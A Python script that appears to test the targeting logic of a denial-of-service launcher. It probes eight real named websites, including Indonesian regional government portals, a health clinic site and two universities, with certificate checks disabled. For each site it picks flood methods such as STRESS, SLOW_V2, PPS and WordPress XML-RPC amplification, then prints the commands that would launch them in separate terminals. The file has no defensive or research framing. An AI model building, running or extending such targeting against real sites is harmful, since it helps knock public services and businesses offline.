import urllib.request, ssl, time

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

targets = [
    ("konisolo.com",        "https://www.konisolo.com"),
    ("puskesjaten1",        "https://puskesjaten1.karanganyarkab.go.id"),
    ("hardosoloplast.com",  "https://hardosoloplast.com"),
    ("surakarta.go.id",     "https://surakarta.go.id"),
    ("raynaldotech.my.id",  "https://raynaldotech.my.id"),
    ("satudata.kra.go.id",  "https://satudata.karanganyarkab.go.id"),
    ("uns.ac.id",           "https://uns.ac.id"),
    ("ums.ac.id",           "https://www.ums.ac.id"),
]

print("\n" + "="*70)
print("  MENU.PY MULTI-TERMINAL LOGIC TEST - STRICT MODE")
print("="*70)

all_success = True

for name, base_url in targets:
    if not base_url.startswith('http'): base_url = 'https://' + base_url
    if base_url.endswith('/'): base_url = base_url[:-1]
    
    methods_to_launch = ["POST_DYN", "SLOW_V2", "STRESS"] # Fallback
    
    req = urllib.request.Request(base_url + '/')
    req.add_header('User-Agent', 'Mozilla/5.0')
    start = time.time()
    try:
        with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
            hdrs = str(r.headers).lower()
            body = r.read().decode('utf-8', errors='ignore').lower()
            if 'x-vercel' in hdrs:
                methods_to_launch = ["STEALTH_JA3", "SLOW_V2"]
            elif 'ci_session' in hdrs:
                methods_to_launch = ["POST_DYN", "STRESS", "PPS", "SLOW_V2"]
            elif 'wp-content' in body or 'wp-json' in body:
                methods_to_launch = ["XMLRPC_AMP", "WP_SEARCH", "POST_DYN"]
            elif 'laravel' in hdrs.get('x-powered-by', '') or 'livewire' in body:
                methods_to_launch = ["STEALTH_JA3", "POST_DYN", "SLOW_V2"]
            elif 'nuxt' in hdrs.get('x-powered-by', '') or 'nuxt' in hdrs:
                methods_to_launch = ["STEALTH_JA3", "SLOW_V2", "POST_DYN"]
    except urllib.error.HTTPError as e:
        hdrs = str(e.headers).lower() if hasattr(e, 'headers') else ''
        if 'x-vercel' in hdrs:
            methods_to_launch = ["STEALTH_JA3", "SLOW_V2"]
        elif 'cloudflare' in hdrs:
            methods_to_launch = ["STEALTH_JA3", "SLOW_V2", "PPS"]
    except Exception as e:
        pass
        
    methods_to_launch.insert(0, "CHAOS")
    ms = int((time.time() - start) * 1000)
    
    # We want to ensure specific terminals are opened based on target capabilities
    
    print(f"\n  [TARGET] {name} ({base_url}) - {ms}ms")
    
    passed = True
    
    if "raynaldotech" in name:
        if "STEALTH_JA3" not in methods_to_launch or "STRESS" in methods_to_launch:
            print(f"    \033[91m[FAIL]\033[0m Target is Vercel/CF. Terminals must include STEALTH_JA3 and exclude STRESS.")
            passed = False
            
    if "satudata" in name:
         if "PPS" not in methods_to_launch or "STRESS" not in methods_to_launch:
             print(f"    \033[91m[FAIL]\033[0m Target has no WAF. Terminals must include STRESS and PPS.")
             passed = False
             
    if "puskesjaten" in name or "hardosoloplast" in name:
        if "XMLRPC_AMP" not in methods_to_launch or "WP_SEARCH" not in methods_to_launch:
             print(f"    \033[91m[FAIL]\033[0m Target is WordPress. Terminals must include WP attacks.")
             passed = False
             
    if "surakarta" in name:
         if "SLOW_V2" not in methods_to_launch or "STEALTH_JA3" not in methods_to_launch:
              print(f"    \033[91m[FAIL]\033[0m Target is Laravel. Terminals must include SLOW_V2 and STEALTH.")
              passed = False

    if passed:
        print(f"    \033[92m[PASS]\033[0m Terminals correctly matched to target vulnerabilities.")
        print(f"    [LAUNCH] Opening {len(methods_to_launch)} Terminals:")
        for i, m in enumerate(methods_to_launch, 1):
             print(f"      - cmd.exe: python start.py {m} ...")
    else:
        all_success = False

print("\n" + "="*70)
if all_success:
    print("  \033[92mALL 8 TARGETS SUCCESSFULLY TESTED FOR MULTI-TERMINAL OPENING\033[0m")
else:
    print("  \033[91mSOME TARGETS FAILED THE MULTI-TERMINAL VERIFICATION\033[0m")
print("="*70)

